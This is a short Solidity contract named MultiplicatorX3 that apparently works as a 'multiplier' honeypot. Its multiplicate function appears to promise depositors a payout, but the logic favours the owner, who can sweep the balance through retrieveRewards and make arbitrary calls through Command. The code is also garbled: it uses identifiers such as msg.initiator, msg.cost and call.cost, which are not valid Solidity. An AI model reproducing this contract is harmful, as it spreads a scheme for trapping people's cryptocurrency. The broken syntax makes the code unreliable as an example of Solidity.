// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.initiator;

    function() public payable{}

    function retrieveRewards()
    payable
    public
    {
        require(msg.initiator == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.initiator == Owner);
        adr.call.cost(msg.cost)(details);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.cost>=this.balance)
        {
            adr.transfer(this.balance+msg.cost);
        }
    }
}